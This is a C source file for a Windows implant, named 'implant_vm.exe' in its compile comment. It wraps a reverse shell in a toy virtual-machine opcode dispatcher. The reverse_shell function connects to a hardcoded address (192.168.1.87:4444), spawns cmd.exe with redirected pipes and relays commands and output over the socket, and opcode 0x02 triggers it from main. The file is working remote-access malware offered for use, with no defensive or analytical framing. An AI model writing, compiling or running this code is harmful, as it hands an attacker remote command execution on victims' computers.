#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#pragma comment(lib, "ws2_32.lib")

#define STACK_SIZE 128

// Operand structures and VM structures as before (kept for the sake of completeness)
struct ImmediateOperand { uint64_t value; };
struct MemoryOperand { uint8_t size, base, index, scale; int32_t displacement; };
struct RegisterOperand { uint8_t reg, chunk; uint16_t size; uint32_t pad; };
union Operand { struct ImmediateOperand imm; struct MemoryOperand mem; struct RegisterOperand reg; };
struct Instruction { uint8_t opcode, lparam_type : 4, rparam_type : 4; union Operand lparam, rparam; };
struct Context { uint32_t ip; uint8_t flags; uint64_t registers[17]; struct Instruction* instructions; uint8_t stack[STACK_SIZE]; };

void reverse_shell(const char* server_ip, int port) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed: %d\n", WSAGetLastError());
        return;
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(server_ip);
    server.sin_port = htons(port);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("Connection failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return;
    }

    printf("Connection established to %s:%d\n", server_ip, port);

    // Setup pipes for process I/O redirection
    HANDLE hReadPipeIn, hWritePipeIn, hReadPipeOut, hWritePipeOut;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    CreatePipe(&hReadPipeIn, &hWritePipeIn, &sa, 0);
    CreatePipe(&hReadPipeOut, &hWritePipeOut, &sa, 0);

    // Set up STARTUPINFO to redirect stdin, stdout, stderr
    STARTUPINFO si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hReadPipeIn;
    si.hStdOutput = hWritePipeOut;
    si.hStdError = hWritePipeOut;

    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed: %d\n", GetLastError());
        CloseHandle(hReadPipeIn);
        CloseHandle(hWritePipeIn);
        CloseHandle(hReadPipeOut);
        CloseHandle(hWritePipeOut);
        closesocket(sock);
        WSACleanup();
        return;
    }

    printf("cmd.exe launched. Waiting for process to complete...\n");

    // Relay data between the socket and cmd.exe
    char buffer[1024];
    DWORD bytesRead, bytesWritten;
    while (1) {
        if (PeekNamedPipe(hReadPipeOut, NULL, 0, NULL, &bytesRead, NULL) && bytesRead > 0) {
            ReadFile(hReadPipeOut, buffer, sizeof(buffer), &bytesRead, NULL);
            send(sock, buffer, bytesRead, 0);
        }

        int received = recv(sock, buffer, sizeof(buffer), 0);
        if (received <= 0) break;
        WriteFile(hWritePipeIn, buffer, received, &bytesWritten, NULL);
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipeIn);
    CloseHandle(hWritePipeIn);
    CloseHandle(hReadPipeOut);
    CloseHandle(hWritePipeOut);
    closesocket(sock);
    WSACleanup();
}

void opcode_reverse_shell(struct Context* vm) { reverse_shell("192.168.1.87", 4444); }

void dispatch_instruction(struct Context* vm) {
    struct Instruction* instr = &vm->instructions[vm->ip];
    if (instr->opcode == 0x02) opcode_reverse_shell(vm);
}

int main() {
    struct Context vm = { .ip = 0 };
    struct Instruction instructions[1];
    instructions[0].opcode = 0x02;
    vm.instructions = instructions;
    dispatch_instruction(&vm);
    return 0;
}

// x86_64-w64-mingw32-gcc -o implant_vm.exe implant_vm.c -lws2_32
